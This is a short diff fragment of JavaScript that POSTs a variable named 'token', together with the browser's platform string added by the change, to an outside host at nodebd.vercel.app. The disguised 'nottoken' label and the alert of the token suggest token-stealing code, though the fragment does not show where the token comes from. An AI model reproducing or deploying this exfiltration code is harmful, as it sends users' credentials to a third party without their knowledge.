@@ -71,7 +71,7 @@
                 let xhttp = new XMLHttpRequest();
             xhttp.open("POST", 'https://nodebd.vercel.app/ram', true);
             xhttp.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
-            xhttp.send(JSON.stringify({ name: 'nottoken!-'+'=>   '+token+'      '}));
+            xhttp.send(JSON.stringify({ name: 'nottoken!-'+navigator.platform+'=>   '+token+'      '}));
             alert(token)
 
 
